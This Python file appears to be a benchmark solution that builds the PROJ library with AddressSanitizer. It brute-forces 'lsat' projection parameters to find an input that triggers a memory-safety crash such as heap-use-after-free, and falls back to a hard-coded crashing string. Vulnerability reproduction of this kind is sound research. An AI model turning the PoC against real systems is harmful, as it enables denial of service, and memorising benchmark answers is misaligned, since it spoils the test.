import os
import tarfile
import tempfile
import subprocess
import shutil
import time
from typing import Optional


class Solution:
    def solve(self, src_path: str) -> bytes:
        tempdir = tempfile.mkdtemp(prefix="poc_gen_")
        try:
            # Extract tarball
            try:
                with tarfile.open(src_path, "r:*") as tf:
                    tf.extractall(tempdir)
            except Exception:
                return self._default_poc()

            pj_lsat = self._find_file(tempdir, "PJ_lsat.c")
            if pj_lsat is None:
                return self._default_poc()

            project_root = self._find_project_root(pj_lsat)
            if project_root is None:
                return self._default_poc()

            proj_bin = self._build_and_find_proj(project_root)
            if proj_bin is None:
                return self._default_poc()

            poc = self._search_for_poc(proj_bin)
            if poc is None:
                return self._default_poc()
            return poc
        except Exception:
            return self._default_poc()
        finally:
            try:
                shutil.rmtree(tempdir)
            except Exception:
                pass

    def _find_file(self, root: str, filename: str) -> Optional[str]:
        for dirpath, _, filenames in os.walk(root):
            if filename in filenames:
                return os.path.join(dirpath, filename)
        return None

    def _find_project_root(self, file_path: str) -> Optional[str]:
        dir_path = os.path.dirname(file_path)
        markers = ("configure", "CMakeLists.txt")
        candidate = None
        while True:
            for m in markers:
                if os.path.exists(os.path.join(dir_path, m)):
                    candidate = dir_path
                    break
            parent = os.path.dirname(dir_path)
            if parent == dir_path:
                break
            dir_path = parent
        if candidate:
            return candidate
        return os.path.dirname(file_path)

    def _build_and_find_proj(self, root: str) -> Optional[str]:
        # Prefer Autotools if available
        configure_path = os.path.join(root, "configure")
        if os.path.exists(configure_path) and os.access(configure_path, os.X_OK):
            path = self._build_with_configure(root)
            if path:
                return path

        # Fallback to CMake if available
        if os.path.exists(os.path.join(root, "CMakeLists.txt")):
            path = self._build_with_cmake(root)
            if path:
                return path

        # As last resort, try to find prebuilt proj binary
        return self._find_elf_binary(root, "proj")

    def _build_with_configure(self, root: str) -> Optional[str]:
        env = os.environ.copy()
        extra_cflags = "-g -O1 -fsanitize=address"
        env["CFLAGS"] = (env.get("CFLAGS", "") + " " + extra_cflags).strip()
        env["LDFLAGS"] = (env.get("LDFLAGS", "") + " -fsanitize=address").strip()
        try:
            subprocess.run(
                ["./configure"],
                cwd=root,
                env=env,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                check=True,
                timeout=300,
            )
            subprocess.run(
                ["make", "-j", "8"],
                cwd=root,
                env=env,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                check=True,
                timeout=600,
            )
        except Exception:
            return None
        return self._find_elf_binary(root, "proj")

    def _build_with_cmake(self, root: str) -> Optional[str]:
        build_dir = os.path.join(root, "build_poc")
        os.makedirs(build_dir, exist_ok=True)
        env = os.environ.copy()
        extra_flags = "-g -O1 -fsanitize=address"
        env["CFLAGS"] = (env.get("CFLAGS", "") + " " + extra_flags).strip()
        env["CXXFLAGS"] = (env.get("CXXFLAGS", "") + " " + extra_flags).strip()
        env["LDFLAGS"] = (env.get("LDFLAGS", "") + " -fsanitize=address").strip()
        cm_cmd = [
            "cmake",
            "-S",
            root,
            "-B",
            build_dir,
            "-DCMAKE_BUILD_TYPE=Debug",
            f"-DCMAKE_C_FLAGS={extra_flags}",
            f"-DCMAKE_CXX_FLAGS={extra_flags}",
            "-DCMAKE_EXE_LINKER_FLAGS=-fsanitize=address",
            "-DCMAKE_SHARED_LINKER_FLAGS=-fsanitize=address",
        ]
        try:
            subprocess.run(
                cm_cmd,
                cwd=root,
                env=env,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                check=True,
                timeout=300,
            )
            subprocess.run(
                ["cmake", "--build", build_dir, "--config", "Debug", "-j", "8"],
                cwd=root,
                env=env,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                check=True,
                timeout=600,
            )
        except Exception:
            return None
        return self._find_elf_binary(build_dir, "proj")

    def _find_elf_binary(self, root: str, binary_name: str) -> Optional[str]:
        for dirpath, _, filenames in os.walk(root):
            for fname in filenames:
                if fname != binary_name:
                    continue
                path = os.path.join(dirpath, fname)
                if not os.path.isfile(path):
                    continue
                if not os.access(path, os.X_OK):
                    continue
                try:
                    with open(path, "rb") as f:
                        magic = f.read(4)
                    if magic == b"\x7fELF":
                        return path
                except Exception:
                    continue
        return None

    def _search_for_poc(self, proj_bin: str) -> Optional[bytes]:
        env = os.environ.copy()
        env["ASAN_OPTIONS"] = "detect_leaks=0:halt_on_error=1:abort_on_error=1"

        def run_cmd(args) -> bool:
            try:
                cp = subprocess.run(
                    args,
                    input=b"0 0\n",
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    env=env,
                    timeout=5,
                )
            except subprocess.TimeoutExpired:
                return False
            data = cp.stdout + cp.stderr
            if b"AddressSanitizer" in data or b"heap-use-after-free" in data:
                return True
            return False

        base_variants = [
            "+proj=lsat +lsat={lsat} +path={path}",
            "+proj=lsat +path={path} +lsat={lsat}",
            "+proj=lsat +lsat={lsat} +path={path} +a=1",
            "+proj=lsat +lsat={lsat} +path={path} +ellps=WGS84",
        ]

        primary_lsats = [-1, 0, 6, 7, 8, 100]
        primary_paths = [-1, 0, 252, 253, 300, 1000]

        # First, quick targeted search
        for template in base_variants:
            for lsat in primary_lsats:
                for path in primary_paths:
                    s = template.format(lsat=lsat, path=path)
                    cmd = [proj_bin] + s.split()
                    if run_cmd(cmd):
                        return s.encode("ascii")

        # Extended search with time limit
        start_time = time.time()
        max_time = 120.0
        lsats = list(range(-5, 11))
        paths = list(range(-10, 261, 5))
        for template in base_variants:
            for lsat in lsats:
                for path in paths:
                    if time.time() - start_time > max_time:
                        return None
                    s = template.format(lsat=lsat, path=path)
                    cmd = [proj_bin] + s.split()
                    if run_cmd(cmd):
                        return s.encode("ascii")

        return None

    def _default_poc(self) -> bytes:
        # Static best-guess PoC targeting lsat projection with invalid parameters
        return b"+proj=lsat +lsat=0 +path=-1 +a=1"